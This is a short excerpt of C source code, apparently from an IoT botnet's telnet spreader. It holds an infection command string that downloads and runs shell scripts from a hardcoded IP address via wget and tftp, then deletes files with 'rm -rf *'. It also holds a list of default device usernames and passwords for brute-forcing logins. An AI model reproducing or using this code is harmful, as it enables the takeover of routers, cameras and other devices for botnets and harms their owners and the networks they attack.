...
char *infectline = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://162.250.124.40/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 162.250.124.40 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 162.250.124.40; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *; exit\r\n";
...
char *usernames[] = {"root\0", "admin\0"};
char *passwords[] = {"root\0", "admin\0", "1234\0", "vizxv\0", "password\0", "\0", "12345\0", "123456\0", "realtek\0", "cisco\0", "system\0", "ikwb\0", "dreambox\0"};
